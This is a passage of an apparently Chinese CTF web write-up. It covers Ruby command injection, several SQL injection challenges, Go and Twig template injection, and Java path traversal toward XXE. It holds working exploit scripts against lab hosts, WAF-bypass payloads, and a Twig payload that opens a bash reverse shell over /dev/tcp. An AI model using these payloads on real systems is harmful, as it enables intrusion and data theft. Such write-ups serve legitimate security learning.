Base64.encode64(res).gsub(<span class="hljs-regexp">/\s*/</span>, <span class="hljs-string">&#x27;&#x27;</span>) + <span class="hljs-string">&quot;\&quot;;\n&quot;</span><br>  <span class="hljs-keyword">rescue</span><br>    <span class="hljs-string">&#x27;something wrong&#x27;</span><br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>
<p>可以发现在convert和upload处都调用了open，因此我们只使用convert这个路由，先注入命令，由于存在可以读取文件的路由，我们直接将执行结果写入文件，再读取编码后的文件。</p>
<p>对于rce命令的过滤，我们利用base64编码绕过。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inject</span>():</span><br>    <span class="hljs-keyword">global</span> url,rce_data<br>    cmd = <span class="hljs-string">&quot;ls /&quot;</span><br>    en_cmd = base64.b64encode(cmd.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <br>    data = rce_data<br>    data[<span class="hljs-string">&#x27;file&#x27;</span>] = data[<span class="hljs-string">&#x27;file&#x27;</span>].<span class="hljs-built_in">format</span>(en_cmd)<br>    r = requests.post(url=url,data = data)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>():</span><br>    <span class="hljs-keyword">global</span> url,read_data<br>    r = requests.post(url=url,data=read_data)<br>    en_text = r.text.split(<span class="hljs-string">&#x27;base64,&#x27;</span>)[<span class="hljs-number">1</span>][:-<span class="hljs-number">3</span>]<br>    <span class="hljs-built_in">print</span>(base64.b64decode(en_text.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    url = <span class="hljs-string">&quot;http://1.14.71.254:28087/convert&quot;</span><br>    rce_data = &#123;<br>        <span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-string">&quot;| `echo &#x27;&#123;&#125;&#x27; | base64 -d` &gt; 1.png&quot;</span><br>    &#125;<br>    read_data = &#123;<br>        <span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-string">&quot;1.png&quot;</span><br>    &#125;<br>    inject()<br>    read()<br></code></pre></td></tr></table></figure>
<h2 id="sql注入">3、SQL注入</h2>
<h3 id="nisa-hardsqlquine技术">1、NISA-hardsql（quine技术）</h3>
<p>这道题上来就先给了sql语句</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT passwd FROM users WHERE username=&#x27;bilala&#x27; and passwd=&#x27;<span class="hljs-subst">$password</span>&#x27;;&quot;</span>;<br></code></pre></td></tr></table></figure>
<p>首先是fuzz一下，发现空格过不了，or没有被屏蔽，于是可以构造语句如</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27;/**/or/**/passwd/**/like/**/&#x27;&#x27;#	</span><br></code></pre></td></tr></table></figure>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://1.14.71.254:28150/login.php&quot;</span><br><br><span class="hljs-comment"># username=bilala&amp;passwd=-1&#x27;/**/or/**/passwd/**/like/**/&#x27;b2f2d15b3ae082ca29697d8dcd420fd7&#x27;#</span><br><br>flag = <span class="hljs-string">&quot;&quot;</span><br><br>data = &#123;<br>    <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;bilala&quot;</span>,<br>    <span class="hljs-string">&quot;passwd&quot;</span>:<span class="hljs-string">&quot;-1&#x27;/**/or/**/passwd/**/like/**/&#x27;&#123;&#125;&#x27;#&quot;</span><br>&#125;<br><br>proxies = &#123;<br>    <span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span><br>&#125;<br><br>loop = <span class="hljs-literal">True</span><br><span class="hljs-keyword">while</span> loop:<br>    loop = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">127</span>):<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">chr</span>(i) == <span class="hljs-string">&#x27;%&#x27;</span>):<br>            <span class="hljs-keyword">continue</span><br>        data[<span class="hljs-string">&#x27;passwd&#x27;</span>] = <span class="hljs-string">&quot;-1&#x27;/**/or/**/passwd/**/like/**/&#x27;&#123;&#125;%&#x27;#&quot;</span>.<span class="hljs-built_in">format</span>(flag + <span class="hljs-built_in">chr</span>(i) )<br><br>        r = requests.post(url=url,proxies=proxies,data=data)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;wrong password&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>            flag += <span class="hljs-built_in">chr</span>(i)<br>            <span class="hljs-built_in">print</span>(flag)<br>            loop = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
<p>但是这样是有风险的，因为你没有对username做限制，直接passwd可能会爆破出来别的用户的密码（那只能limit试过去了。</p>
<p>于是进入之后可以得到源代码，接下来才进入quine的正题。</p>
<p>这里先附上两篇分析：</p>
<p>https://www.cnblogs.com/zhengna/p/15917521.html</p>
<p>https://www.anquanke.com/post/id/253570</p>
<h3 id="nssctfez_sql报错注入联合注入">2、NSSCTF—ez_sql（报错注入&amp;&amp;联合注入）</h3>
<p>这道题一度把我引入了布尔盲注，最后发现其实还是对于waf的探测不够准确。</p>
<p>首先，上来传参为1，这个得到的flag肯定是假的。</p>
<p>尝试了2,3等就没有了结果。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230401164252562.png" srcset="/img/loading.gif" lazyload alt="image-20230401164252562" /></p>
<p>尝试引号闭合以及#闭合，发现仍然正常显示</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230401164448420.png" srcset="/img/loading.gif" lazyload alt="image-20230401164448420" /></p>
<p>尝试使用union联合注入，通过报错发现select 1,2间的引号不见了，怀疑是被过滤了，则使用/**/绕过</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230401164612299.png" srcset="/img/loading.gif" lazyload alt="image-20230401164612299" /></p>
<p>但是绕过之后发现依然不能够完成攻击，这时候怀疑可能还有其他的过滤，测试之下发现果然存在union被过滤了。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230401164839225.png" srcset="/img/loading.gif" lazyload alt="image-20230401164839225" /></p>
<p>就这样一步步测试下去，最后使用联合注入成功拿到flag，也是非常地心累。</p>
<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_payload</span>(<span class="hljs-params">payload</span>):</span><br>    new_payload = payload<br>    new_payload = new_payload.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;/**/&quot;</span>)<br>    new_payload = new_payload.replace(<span class="hljs-string">&quot;or&quot;</span>,<span class="hljs-string">&quot;oorr&quot;</span>)<br>    new_payload = new_payload.replace(<span class="hljs-string">&quot;union&quot;</span>,<span class="hljs-string">&quot;ununionion&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> new_payload<br><br><br>url = <span class="hljs-string">&quot;http://43.142.108.3:28124/&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_database</span>():</span><br>    r = requests.post(url = url,<br>                     data = &#123;<br>                        <span class="hljs-string">&quot;nss&quot;</span>:process_payload(<span class="hljs-string">&quot;2&#x27; union select 1,2,database()#&quot;</span>)<br>                     &#125;)<br>    <span class="hljs-built_in">print</span>(r.text)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_all_tables</span>():</span><br>    r = requests.post(url = url,<br>                     data = &#123;<br>                        <span class="hljs-string">&quot;nss&quot;</span>:process_payload(<span class="hljs-string">&quot;2&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#&quot;</span>)<br>                    &#125;)<br>    <span class="hljs-built_in">print</span>(r.text)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_all_columns</span>():</span><br>    r = requests.post(url = url,<br>                     data = &#123;<br>                        <span class="hljs-string">&quot;nss&quot;</span>:process_payload(<span class="hljs-string">&quot;2&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;NSS_tb&#x27;#&quot;</span>)<br>                    &#125;)<br>    <span class="hljs-built_in">print</span>(r.text)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_all_content</span>():</span><br>    r = requests.post(url = url,<br>                     data = &#123;<br>                        <span class="hljs-string">&quot;nss&quot;</span>:process_payload(<span class="hljs-string">&quot;2&#x27; union select 1,2,group_concat(concat_ws(&#x27;:&#x27;,id,Secr3t,flll444g)) from NSS_tb#&quot;</span>)<br>                    &#125;)<br>    <span class="hljs-built_in">print</span>(r.text)<br><br><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># get_database()</span><br>    <span class="hljs-comment"># get_all_tables()  NSS_tb,users</span><br>    <span class="hljs-comment"># get_all_columns() id,Secr3t,flll444g</span><br>    get_all_content()<br><br><br></code></pre></td></tr></table></figure>
<h3 id="suctfeasysqlsql_mode">3、2019SUCTF—EasySQL（sql_mode）</h3>
<p>这道题算是非常tricky的题目了，最重要的是要分析出背后的SQL语句。</p>
<p>首先是发现对于WAF中的数字会回显Nonono，这就非常有意思了。</p>
<p>先来一手SQL注入的FUZZ，发现屏蔽了大多数，但是没有屏蔽<code>||</code>，我直接来了一手布尔盲注。注出来数据库名之后发现限制长度了，于是这条路就断了。</p>
<p>于是分析SQL语句的返回结果，不是0就是1，那么意味着我们拼接的内容很有可能就是一个布尔表达式。</p>
<p>于是尝试</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-comment">*,1</span><br></code></pre></td></tr></table></figure>
<p>发现直接得到了flag。</p>
<p>最后查看wp发现，真正的SQL语句是</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> &#123;&#125; <span class="hljs-operator">||</span> flag <span class="hljs-keyword">from</span> Flag<br></code></pre></td></tr></table></figure>
<p>在默认情况下，<code>||</code>在SQL语句中表示或，但是可以开启连接模式，官方的WP也是这么做的。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>;<span class="hljs-keyword">set</span> sql_mode<span class="hljs-operator">=</span>PIPES_AS_CONCAT;<span class="hljs-keyword">select</span> <span class="hljs-number">1</span><span class="hljs-operator">||</span>flag <span class="hljs-keyword">from</span> Flag<br></code></pre></td></tr></table></figure>
<p>最后成功拿到flag，存在堆叠注入我还没意识到orz。</p>
<h3 id="网鼎facebooksql查询结果反序列化">4、2018网鼎—FaceBook（sql查询结果反序列化）</h3>
<p>这道题考察的知识点相对还是比较全面的。</p>
<p>进入之后，存在一个登录界面和注册界面，尝试注册发现blog参数一直显示无效。</p>
<p>dirsearch扫描目录之后发现存在<code>robots.txt</code>，查看后发现存在<code>user.php</code></p>
<p>通过<code>user.php</code>找了blog的检查函数，从而成功注册。</p>
<p>注册之后，可以进入view.php查看对应的blog，发现url中的参数no可以注入。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230402001608480.png" srcset="/img/loading.gif" lazyload alt="image-20230402001608480" /></p>
<p>尝试联合注入，union select被过滤，利用/**/绕过即可</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230402001734334.png" srcset="/img/loading.gif" lazyload alt="image-20230402001734334" /></p>
<p>发现可以利用参数2进行回显，于是进一步表，列以及数值。</p>
<p>爆出数据如下，观察数据发现并不存在直接的blog数据存储，而是将user的信息以反序列化的形式存储在数据库。</p>
<p>那么也就意味着我们利用联合注入修改查询到的反序列化数据，就可以实现SSRF访问内网数据（注意此时的blog可以不考虑最初的url限制）。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230402001913349.png" srcset="/img/loading.gif" lazyload alt="image-20230402001913349" /></p>
<p>经过测试发现，data数据是对应的第四项，由此构造对应的payload</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">43.143.7.97:28965</span>//view.php?no=<span class="hljs-number">3</span>%<span class="hljs-number">20</span>union/**/select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,(select &#x27;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>\;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;admin4&quot;</span>\;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>\;i:<span class="hljs-number">20</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>\;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>\;&#125;&#x27;);#<br></code></pre></td></tr></table></figure>
<p>成功读取到flag。</p>
<p>补充，显示的内容会以base64形式编码，需要解码后获取。</p>
<h2 id="ssti">4、SSTI</h2>
<h3 id="sctf-loginmexff漏洞go模板注入">1、SCTF-loginme（XFF漏洞/Go模板注入）</h3>
<p>上来先是一个很明显的XFF</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816154514295.png" srcset="/img/loading.gif" lazyload alt="image-20220816154514295" style="zoom:50%;" /></p>
<p>关键点在于ClientIP的实现，好在我们可以找到ClientIP的实现，除了xff头，还存在X-Real-IP这个利用点。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// ClientIP 尽最大努力实现获取客户端 IP 的算法。</span><br><span class="hljs-comment">// 解析 X-Real-IP 和 X-Forwarded-For 以便于反向代理（nginx 或 haproxy）可以正常工作。</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ClientIP</span><span class="hljs-params">(r *http.Request)</span> <span class="hljs-title">string</span></span> &#123;<br>	xForwardedFor := r.Header.Get(<span class="hljs-string">&quot;X-Forwarded-For&quot;</span>)<br>	ip := strings.TrimSpace(strings.Split(xForwardedFor, <span class="hljs-string">&quot;,&quot;</span>)[<span class="hljs-number">0</span>])<br>	<span class="hljs-keyword">if</span> ip != <span class="hljs-string">&quot;&quot;</span> &#123;<br>		<span class="hljs-keyword">return</span> ip<br>	&#125;<br>	ip = strings.TrimSpace(r.Header.Get(<span class="hljs-string">&quot;X-Real-Ip&quot;</span>))<br>	<span class="hljs-keyword">if</span> ip != <span class="hljs-string">&quot;&quot;</span> &#123;<br>		<span class="hljs-keyword">return</span> ip<br>	&#125;<br>	<span class="hljs-keyword">if</span> ip, _, err := net.SplitHostPort(strings.TrimSpace(r.RemoteAddr)); err == <span class="hljs-literal">nil</span> &#123;<br>		<span class="hljs-keyword">return</span> ip<br>	&#125;<br>	<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>
<p>出现了这样的页面，用于显示用户信息。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816154908285.png" srcset="/img/loading.gif" lazyload alt="image-20220816154908285" style="zoom:50%;" /></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Login</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>	idString, flag := c.GetQuery(<span class="hljs-string">&quot;id&quot;</span>)<br>	<span class="hljs-keyword">if</span> !flag &#123;<br>		idString = <span class="hljs-string">&quot;1&quot;</span><br>	&#125;<br>	id, err := strconv.Atoi(idString)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		id = <span class="hljs-number">1</span><br>	&#125;<br>	TargetUser := structs.Admin<br>	<span class="hljs-keyword">for</span> _, user := <span class="hljs-keyword">range</span> structs.Users &#123;<br>		<span class="hljs-keyword">if</span> user.Id == id &#123;<br>			TargetUser = user<br>		&#125;<br>	&#125;<br><br>	age := TargetUser.Age<br>	<span class="hljs-keyword">if</span> age == <span class="hljs-string">&quot;&quot;</span> &#123;<br>        <span class="hljs-comment">//*******************</span><br>        <span class="hljs-comment">//这里有age的注入点</span><br>        <span class="hljs-comment">//********************</span><br>		age, flag = c.GetQuery(<span class="hljs-string">&quot;age&quot;</span>)<br>		<span class="hljs-keyword">if</span> !flag &#123;<br>			age = <span class="hljs-string">&quot;forever 18 (Tell me the age)&quot;</span><br>		&#125;<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		c.AbortWithError(<span class="hljs-number">500</span>, err)<br>	&#125;<br><br>	html := fmt.Sprintf(templates.AdminIndexTemplateHtml, age)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		c.AbortWithError(<span class="hljs-number">500</span>, err)<br>	&#125;<br><br>	tmpl, err := template.New(<span class="hljs-string">&quot;admin_index&quot;</span>).Parse(html)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		c.AbortWithError(<span class="hljs-number">500</span>, err)<br>	&#125;<br><br>	tmpl.Execute(c.Writer, TargetUser)<br>&#125;<br><br></code></pre></td></tr></table></figure>
<p>发现源代码中在age这个点有渲染，同时我们可以找到age的注入点，猜测是不是go有SSTI。</p>
<p><a target="_blank" rel="noopener" href="https://tyskill.github.io/posts/gossti">GO SSTI初探</a></p>
<p>于是照着文章里尝试看看能不能打出admin的Password，顺利拿到flag。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816155906990.png" srcset="/img/loading.gif" lazyload alt="image-20220816155906990" /></p>
<h3 id="bjdctf-cookie-stubletwig模板注入">2、BJDCTF-Cookie stuble（twig模板注入）</h3>
<p>打开界面，Hint提示看一下Cookies，同时发现前端会动态显示用户名</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/%5BT8KS0BQQGOGD8O0I2H05GU.png" srcset="/img/loading.gif" lazyload alt="img" style="zoom:50%;" /></p>
<p>怀疑是PHP模板注入，测试了smarty的payload，发现不行</p>
<p>于是尝试了twig的payload，发现能够成功，于是反弹shell，拿下flag。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="hljs-string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="hljs-string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure>
<h2 id="xxe">5、XXE</h2>
<h3 id="nctf-xml-cookbook">1、NCTF-XML cookbook</h3>
<h3 id="网鼎20-filejava目录穿越excel-xxe">2、网鼎20-FileJava（目录穿越/Excel XXE）</h3>
<p>文件上传之后出现下载链接，发现可能存在任意文件读取目录</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816150221722.png" srcset="/img/loading.gif" lazyload alt="image-20220816150221722" style="zoom:50%;" /></p>
<p>尝试读取根目录的<code>/etc/passwd</code></p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816150356769.png" srcset="/img/loading.gif" lazyload alt="image-20220816150356769" style="zoom:50%;" /></p>
<p>接下来尝试获取目录，我们利用500报错获取网站部署的路径。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816151222621.png" srcset="/img/loading.gif" lazyload alt="image-20220816151222621" style="zoom:50%;" /></p>
<p>接下来尝试获取网站的路由信息</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816151522399.png" srcset="/img/loading.gif" lazyload alt="image-20220816151522399" style="zoom:50%;" /></p>
<p>拉到路由之后，我们直接试试能不能利用Download的接口下载到class文件，从而反编译获得源代码。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>classname = <span class="hljs-string">&quot;DownloadSerlet&quot;</span><br>url = <span class="hljs-string">&quot;http://1.14.71.254:28032/file_in_java/&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(classname)<br>params = &#123;<br>    <span class="hljs-string">&quot;filename&quot;</span>:<span class="hljs-string">&quot;../../../../../../../../../usr/local/tomcat/webapps/file_in_java/WEB-INF/classes/cn/abc/servlet/&#123;&#125;.class&quot;</span>.<span class="hljs-built_in">format</span>(classname)<br>&#125;<br><br>r = requests.get(url=url,params=params)<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Download.class&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>).write(r.content)<br></code></pre></td></tr></table></figure>
<p>拿到之后用<code>jd-gui</code>反编译，康康源代码，发现在<code>upload</code>的地方解析了xlsx文件，可以考虑是不是CVE</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>   String savePath = getServletContext().getRealPath(<span class="hljs-string">&quot;/WEB-INF/upload&quot;</span>);<br>   String tempPath = getServletContext().getRealPath(<span class="hljs-string">&quot;/WEB-INF/temp&quot;</span>);<br>   File tempFile = <span class="hljs-keyword">new</span> File(tempPath);<br>   <span class="hljs-keyword">if</span> (!tempFile.exists())<br>     tempFile.mkdir(); <br>   String message = <span class="hljs-string">&quot;&quot;</span>;<br>   <span class="hljs-keyword">try</span> &#123;<br>     DiskFileItemFactory factory = <span class="hljs-keyword">new</span> DiskFileItemFactory();<br>     factory.setSizeThreshold(<span class="hljs-number">102400</span>);<br>     factory.setRepository(tempFile);<br>     ServletFileUpload upload = <span class="hljs-keyword">new</span> ServletFileUpload((FileItemFactory)factory);<br>     upload.setHeaderEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>     upload.setFileSizeMax(<span class="hljs-number">1048576L</span>);<br>     upload.setSizeMax(<span class="hljs-number">10485760L</span>);<br>     <span class="hljs-keyword">if</span> (!ServletFileUpload.isMultipartContent(request))<br>       <span class="hljs-keyword">return</span>; <br>     List&lt;FileItem&gt; list = upload.parseRequest(request);<br>     <span class="hljs-keyword">for</span> (FileItem fileItem : list) &#123;<br>       <span class="hljs-keyword">if</span> (fileItem.isFormField()) &#123;<br>         String name = fileItem.getFieldName();<br>         String str = 